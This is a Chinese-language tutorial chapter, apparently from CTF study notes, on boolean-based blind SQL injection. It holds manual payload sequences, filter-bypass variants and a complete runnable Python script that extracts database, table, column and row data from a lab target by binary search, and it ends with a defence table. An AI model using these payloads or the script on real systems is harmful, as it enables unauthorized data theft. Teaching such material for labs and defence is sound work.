## 04 布尔盲注 -- 考点精讲

> 前置知识：[[03-报错注入|03-报错注入]] -- 报错不可用时的下一级手段
>
> 关联教程：[[05-时间盲注|05-时间盲注]] · [[../../../archstrike-web教学/04-SQL注入攻击|SQL注入实战]]

### 适用条件

页面**不回显任何查询数据、也不回显报错**，但注入条件真假会导致**两种可区分的页面状态**：

- 真状态：正常返回"用户名：admin"等内容
- 假状态：空白页、"user not exist" 提示、跳转等

判断方法（单引号闭合为例）：

```text
?id=1' and 1=1 --+    页面正常     ← 真锚点
?id=1' and 1=2 --+    页面异常     ← 假锚点
```

两个 payload 页面不同且稳定 → 布尔盲注可行。

### 判断真假锚点

锚点是自动化脚本的核心，必须选一个**机器可判断**的差异：

| 锚点类型 | 真状态特征 | 脚本判断方式 |
|---------|-----------|-------------|
| 内容长度 | 正常页比异常页长 | `len(r.text)` 与基准比较 |
| 特征字符串 | 正常页含 "Login name" | `'keyword' in r.text` |
| HTTP 状态码 | 真 200 / 假 302 或 500 | `r.status_code` |
| 响应头差异 | Set-Cookie 有无 | 检查 headers |

建议先手工确认一次真/假各自的响应，把**假状态的判定条件**写进脚本作为 False 判据。

### 核心函数组合

布尔盲注三板斧——量长度、切字符、转数字：

| 函数 | 作用 | 示例 |
|------|------|------|
| `length(s)` | 字符串长度 | `length(database())>3` |
| `substr(s,pos,len)` | 截取子串（pos 从 1 开始） | `substr(database(),1,1)='s'` |
| `ascii(c)` / `ord(c)` | 字符转 ASCII 码比较 | `ascii(substr(database(),1,1))=115` |
| `left(s,n)` / `right(s,n)` | 取前/后 n 位 | `left(database(),1)='s'` |

为什么用 ascii() 而不是直接比字符？一是避免引号被过滤时没法写字符常量，二是 ASCII 数字便于二分法。

完整猜解结构：

```sql
-- 第 i 个字符是否为 c？（逐个字符问问题）
?id=1' and (select ascii(substr(database(),1,1)))=115 --+
```

### 二分法猜解流程

逐个字符枚举 95 个可见字符太慢，二分只要 7 次：

```text
以猜 database() 第一个字符为例：
1. ascii(substr(database(),1,1)) > 64   真
2. ascii(substr(database(),1,1)) > 96   真      → 范围缩到 [97,126]
3. ascii(substr(database(),1,1)) > 112  真      → [113,126]
4. ascii(substr(database(),1,1)) > 120  假      → [113,120]
5. ...继续折半
6. ascii(substr(database(),1,1)) = 115  真      → 's'
每个字符约 7 次请求确定，库名 4 字符共 28 次请求。
```

### 手工 payload 序列

单引号闭合示例：

```sql
-- 1. 测当前库名长度
?id=1' and length(database())=4 --+          ← 真，库名 4 位

-- 2. 二分/等值猜第 n 个字符
?id=1' and ascii(substr(database(),1,1))=115 --+   ← s

-- 3. 库名出来后爆表名长度
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema='sqli'))=9 --+

-- 4. 逐位猜表名（substr 对子查询同样适用）
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),1,1))=102 --+

-- 5. 猜列名、数据同构，只换内层子查询
?id=1' and ascii(substr((select flag from sqli.flag limit 0,1),1,1))=99 --+
```

### Python 自动化猜解脚本

完整可运行，按库名 → 表名 → 列名 → 数据四阶段推进：

```python
import requests

URL = "http://target/Less-8/?id="
TIMEOUT = 10

def is_true(payload):
    """真状态返回 True。按目标实际响应修改判据。"""
    try:
        r = requests.get(URL + payload, timeout=TIMEOUT)
        return "You are in" in r.text          # Less-8 的真锚点
    except requests.RequestException:
        return False

def binary_search(expr):
    """二分法猜解表达式结果的整串（ASCII 可见字符）。"""
    result = ""
    pos = 1
    while True:
        left, right = 32, 127                  # ASCII 可见范围
        if not is_true(f"1' and length({expr})>={pos}--+"):
            break                              # 长度不够了，结束
        while left < right:
            mid = (left + right) // 2
            if is_true(f"1' and ascii(substr({expr},{pos},1))>{mid}--+"):
                left = mid + 1
            else:
                right = mid
        if left == 32:                         # 探到边界外，收工
            break
        result += chr(left)
        pos += 1
        print(f"[+] {result}")
    return result

def main():
    # 阶段 1: 当前数据库
    db = binary_search("database()")
    print(f"\n[==] 数据库: {db}")

    # 阶段 2: 该库所有表名
    tbl_expr = (f"(select group_concat(table_name) from information_schema.tables "
                f"where table_schema='{db}')")
    tables = binary_search(tbl_expr)
    print(f"\n[==] 表名: {tables}")

    # 阶段 3: 目标表所有列名（按需改表名）
    table = "flag"
    col_expr = (f"(select group_concat(column_name) from information_schema.columns "
                f"where table_schema='{db}' and table_name='{table}')")
    columns = binary_search(col_expr)
    print(f"\n[==] 列名: {columns}")

    # 阶段 4: 数据（按需改列名）
    column = columns.split(",")[-1]
    data_expr = f"(select group_concat({column}) from {db}.{table})"
    data = binary_search(data_expr)
    print(f"\n[==] 数据: {data}")

if __name__ == "__main__":
    main()
```

适配其他靶场只需改两处：URL 和 `is_true()` 里的锚点判据；闭合方式不同改 payload 前缀（如 `1"` 或 `1')`）。

### 变体写法

引号或等号被过滤时的替代构造：

| 变体 | payload 示例 | 适用场景 |
|------|-------------|---------|
| like | `?id=1' and (select table_name from information_schema.tables limit 0,1) like 'a%' --+` | 过滤 `=` |
| left/right | `?id=1' and left(database(),1)='s' --+` | 过滤 substr |
| regexp | `?id=1' and (select group_concat(table_name) from information_schema.tables where table_schema=database()) regexp '^f' --+` | 逐表前缀匹配，效率高 |
| in | `?id=1' and substr(database(),1,1) in ('s') --+` | 配合字典批量验证 |

regexp 技巧：先 `^flag` 确认前缀再逐字延伸，某些场景比逐字符快得多。

### 效率优化对比

| 方案 | 单字符请求数 | 说明 |
|------|------------|------|
| 全枚举 | 最多 95 次 | 只适合演示 |
| **二分法** | 约 7 次 | 最通用，推荐默认 |
| regexp 前缀 | 每表约 len 次 | 猜整个字符串而非逐字符，命中快 |
| 多线程并发 | - | 不同位置/区间并行，注意别打挂靶场 |

### 防御手段

| 防御方式 | 说明 |
|---------|------|
| 统一错误与空态页面 | 真假状态返回相同长度与文案，消灭锚点 |
| 预编译 | 根治方案，同前几章 |
| 限制请求频率 | WAF 层限速，让盲注的成千上万次请求不可行 |
| 监控异常访问模式 | 同一参数高频二分式访问直接封禁 |
